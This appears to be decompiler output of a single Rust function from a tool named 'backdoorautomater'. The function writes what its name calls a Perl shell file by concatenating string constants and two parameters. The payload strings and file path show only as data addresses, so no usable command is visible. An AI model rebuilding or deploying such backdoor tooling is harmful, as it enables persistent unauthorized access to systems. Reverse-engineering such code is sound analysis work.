long _ZN17backdoorautomater13modifyservice16write_shell_perl17h8eb642524aa8e285E
               (long param_1,long param_2)

{
  long lVar1;
  int local_8c;
  undefined8 local_88;
  long local_80;
  undefined4 local_78;
  undefined4 uStack_74;
  undefined4 uStack_70;
  undefined4 uStack_6c;
  undefined4 local_68;
  undefined4 uStack_64;
  undefined4 uStack_60;
  undefined4 uStack_5c;
  undefined8 local_58;
  undefined4 local_48;
  undefined4 uStack_44;
  undefined4 uStack_40;
  undefined4 uStack_3c;
  undefined8 local_38;
  undefined4 local_30;
  undefined4 uStack_2c;
  undefined4 uStack_28;
  undefined4 uStack_24;
  undefined8 local_20;
  
                    /* try { // try from 001557a2 to 001557b7 has its CatchHandler @ 00155a6e */
  _ZN3std2fs4File6create17hf69a1aea5d21dd7bE(&local_88,&DAT_00265fea,0x12);
  lVar1 = local_80;
  if ((int)local_88 == 0) {
    local_8c = local_88._4_4_;
                    /* try { // try from 001557d1 to 0015582d has its CatchHandler @ 00155a5b */
    lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E(&local_8c,&DAT_00265ffc,0xc);
    if (lVar1 == 0) {
      local_78 = *(undefined4 *)(param_2 + 8);
      uStack_74 = *(undefined4 *)(param_2 + 0xc);
      uStack_70 = *(undefined4 *)(param_2 + 0x10);
      uStack_6c = *(undefined4 *)(param_2 + 0x14);
      local_88 = &DAT_00265aa3;
      local_80 = 4;
      _ZN5alloc3str17join_generic_copy17hc78a65dc4338aaa9E(&local_30,&local_88,2,1,0);
      local_58 = local_20;
      local_68 = local_30;
      uStack_64 = uStack_2c;
      uStack_60 = uStack_28;
      uStack_5c = uStack_24;
                    /* try { // try from 00155842 to 001558b1 has its CatchHandler @ 00155a4c */
      _ZN5alloc3vec16Vec_LT_T_C_A_GT_17extend_from_slice17h3cce9f7974121c70E
                (&local_68,&DAT_00265a9c,3);
      lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E
                        (&local_8c,CONCAT44(uStack_5c,uStack_60),local_58);
      if (lVar1 == 0) {
        local_78 = *(undefined4 *)(param_1 + 8);
        uStack_74 = *(undefined4 *)(param_1 + 0xc);
        uStack_70 = *(undefined4 *)(param_1 + 0x10);
        uStack_6c = *(undefined4 *)(param_1 + 0x14);
        local_88 = &DAT_00266008;
        local_80 = 3;
        _ZN5alloc3str17join_generic_copy17hc78a65dc4338aaa9E(&local_30,&local_88,2,1,0);
        local_38 = local_20;
        local_48 = local_30;
        uStack_44 = uStack_2c;
        uStack_40 = uStack_28;
        uStack_3c = uStack_24;
                    /* try { // try from 001558c6 to 001559cd has its CatchHandler @ 00155a3d */
        _ZN5alloc3vec16Vec_LT_T_C_A_GT_17extend_from_slice17h3cce9f7974121c70E
                  (&local_48,&DAT_00265fe8,2);
        lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E
                          (&local_8c,CONCAT44(uStack_3c,uStack_40),local_38);
        if (((((lVar1 == 0) &&
              (lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E(&local_8c,&DAT_0026600b,0x35),
              lVar1 == 0)) &&
             (lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E(&local_8c,&DAT_00266040,0x2e),
             lVar1 == 0)) &&
            ((lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E(&local_8c,&DAT_0026606e,0x13),
             lVar1 == 0 &&
             (lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E(&local_8c,&DAT_00266081,0x14),
             lVar1 == 0)))) &&
           ((lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E(&local_8c,&DAT_00266095,0x14),
            lVar1 == 0 &&
            ((lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E(&local_8c,&DAT_002660a9,0x1a),
             lVar1 == 0 &&
             (lVar1 = _ZN3std2io5Write9write_all17h18f2f3ca7c9bcc20E(&local_8c,&DAT_002660c3,3),
             lVar1 == 0)))))) {
                    /* try { // try from 00155a13 to 00155a1c has its CatchHandler @ 00155a4c */
          _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_48);
                    /* try { // try from 00155a1d to 00155a26 has its CatchHandler @ 00155a5b */
          _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_68);
                    /* try { // try from 00155a2b to 00155a2f has its CatchHandler @ 00155a6e */
          _ZN4core3ptr34drop_in_place_LT_std__fs__File_GT_17hb99078073e1bf56bE(local_8c);
                    /* try { // try from 00155a30 to 00155a37 has its CatchHandler @ 00155a69 */
          _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(param_2);
          lVar1 = 0;
          goto LAB_001559fb;
        }
                    /* try { // try from 001559d6 to 001559df has its CatchHandler @ 00155a4c */
        _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_48);
      }
                    /* try { // try from 001559e0 to 001559e9 has its CatchHandler @ 00155a5b */
      _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(&local_68);
    }
                    /* try { // try from 001559ee to 001559f2 has its CatchHandler @ 00155a6e */
    _ZN4core3ptr34drop_in_place_LT_std__fs__File_GT_17hb99078073e1bf56bE(local_8c);
  }
                    /* try { // try from 001559f3 to 001559fa has its CatchHandler @ 00155a69 */
  _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(param_2);
LAB_001559fb:
  _ZN4core3ptr42drop_in_place_LT_alloc__string__String_GT_17h944c33df58684028E(param_1);
  return lVar1;
}